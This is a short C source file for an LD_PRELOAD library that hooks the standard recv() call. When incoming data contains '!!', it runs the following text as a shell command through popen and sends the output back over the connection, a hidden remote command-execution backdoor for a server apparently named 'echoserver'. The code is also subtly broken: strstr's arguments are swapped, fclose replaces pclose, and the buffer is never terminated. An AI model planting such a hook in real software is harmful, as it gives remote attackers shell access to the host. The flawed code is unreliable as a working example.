#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <dlfcn.h>

ssize_t recv(int socket, void *buffer, size_t length, int flags) {
  /* get original recv */
  int (*original_recv)(int, void*, size_t, int);
  original_recv = dlsym(RTLD_NEXT, "recv");
  
  /* read input from server into buffer */
  FILE *fp;
  int read = original_recv(socket, buffer, length, flags);
  char *command = strstr("!!", buffer);

  /* occurrence of !!  */
  if (command != NULL) {
    command = command + 2; // ignore "!!"
    fp = popen(command, "r"); // command output to fp
    fgets(buffer, length, fp); // put output to buffer
    fclose(fp);
    send(socket, buffer, read, 0); // finally, send command output
    return 0; // makes sure echoserver is done reading
  }
  return read; // proceed normally
}
